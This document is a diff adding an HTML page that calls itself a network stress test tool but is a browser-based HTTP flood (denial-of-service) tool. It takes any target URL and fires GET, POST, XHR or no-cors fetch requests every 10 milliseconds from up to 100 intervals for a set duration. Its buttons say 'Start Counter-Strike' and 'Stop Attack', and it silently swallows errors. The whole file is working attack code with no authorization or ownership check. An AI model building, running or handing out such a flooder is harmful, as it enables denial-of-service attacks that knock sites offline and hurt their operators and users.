@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Stress Test Tool</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+            color: #00ff00;
+        }
+        .container {
+            background-color: #2d2d2d;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #00ff00;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input, select {
+            width: 100%;
+            padding: 8px;
+            background-color: #1a1a1a;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #ff0000;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:disabled {
+            background-color: #666;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .log {
+            background-color: #1a1a1a;
+            padding: 10px;
+            border-radius: 4px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 10px;
+            border: 1px solid #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ Network Stress Test Tool</h1>
+        
+        <div class="form-group">
+            <label for="targetUrl">Target URL:</label>
+            <input type="text" id="targetUrl" placeholder="https://example.com" value="https://">
+        </div>
+
+        <div class="form-group">
+            <label for="threads">Number of Threads:</label>
+            <input type="number" id="threads" value="10" min="1" max="100">
+        </div>
+
+        <div class="form-group">
+            <label for="duration">Duration (seconds):</label>
+            <input type="number" id="duration" value="30" min="1" max="300">
+        </div>
+
+        <div class="form-group">
+            <label for="method">Attack Method:</label>
+            <select id="method">
+                <option value="GET">HTTP GET Flood</option>
+                <option value="POST">HTTP POST Flood</option>
+                <option value="XHR">XMLHttpRequest</option>
+                <option value="fetch">Fetch API</option>
+            </select>
+        </div>
+
+        <button id="startBtn" onclick="startAttack()">🚀 Start Counter-Strike</button>
+        <button id="stopBtn" onclick="stopAttack()" disabled>🛑 Stop Attack</button>
+
+        <div class="status">
+            <strong>Status: </strong><span id="status">Ready</span>
+        </div>
+
+        <div class="log" id="log"></div>
+    </div>
+
+    <script>
+        let attackActive = false;
+        let requestCount = 0;
+        let workers = [];
+        let startTime;
+
+        function log(message) {
+            const logElement = document.getElementById('log');
+            const timestamp = new Date().toLocaleTimeString();
+            logElement.innerHTML += `[${timestamp}] ${message}<br>`;
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        function updateStatus(status) {
+            document.getElementById('status').textContent = status;
+        }
+
+        function startAttack() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const threadCount = parseInt(document.getElementById('threads').value);
+            const duration = parseInt(document.getElementById('duration').value) * 1000;
+            const method = document.getElementById('method').value;
+
+            if (!targetUrl || targetUrl === 'https://') {
+                alert('Please enter a valid target URL');
+                return;
+            }
+
+            attackActive = true;
+            requestCount = 0;
+            workers = [];
+            startTime = Date.now();
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+
+            updateStatus('Counter-Strike Active');
+            log(`Starting attack on ${targetUrl}`);
+            log(`Threads: ${threadCount}, Duration: ${duration/1000}s, Method: ${method}`);
+
+            // Create worker threads
+            for (let i = 0; i < threadCount; i++) {
+                const worker = {
+                    id: i,
+                    active: true,
+                    thread: setInterval(() => makeRequest(targetUrl, method, i), 10)
+                };
+                workers.push(worker);
+            }
+
+            // Auto-stop after duration
+            setTimeout(stopAttack, duration);
+        }
+
+        function stopAttack() {
+            attackActive = false;
+            
+            // Clear all worker intervals
+            workers.forEach(worker => {
+                clearInterval(worker.thread);
+            });
+
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+
+            const endTime = Date.now();
+            const duration = (endTime - startTime) / 1000;
+            
+            updateStatus('Counter-Strike Complete');
+            log(`Attack finished after ${duration.toFixed(2)} seconds`);
+            log(`Total requests sent: ${requestCount}`);
+            log(`Average RPS: ${(requestCount / duration).toFixed(2)}`);
+        }
+
+        function makeRequest(url, method, workerId) {
+            if (!attackActive) return;
+
+            const requestId = ++requestCount;
+            
+            try {
+                switch(method) {
+                    case 'GET':
+                        fetch(url + '?req=' + requestId + '&worker=' + workerId + '&rand=' + Math.random())
+                            .catch(error => {});
+                        break;
+                    case 'POST':
+                        fetch(url, {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                data: Math.random().toString(36).substring(7),
+                                timestamp: Date.now(),
+                                worker: workerId
+                            })
+                        }).catch(error => {});
+                        break;
+                    case 'XHR':
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', url + '?xhr=' + requestId, true);
+                        xhr.send();
+                        break;
+                    case 'fetch':
+                        fetch(url, {cache: 'no-cache', mode: 'no-cors'})
+                            .catch(error => {});
+                        break;
+                }
+
+                if (requestCount % 100 === 0) {
+                    log(`Sent ${requestCount} requests...`);
+                }
+            } catch (error) {
+                // Silent fail - expected behavior during stress testing
+            }
+        }
+    </script>
+</body>
+</html>
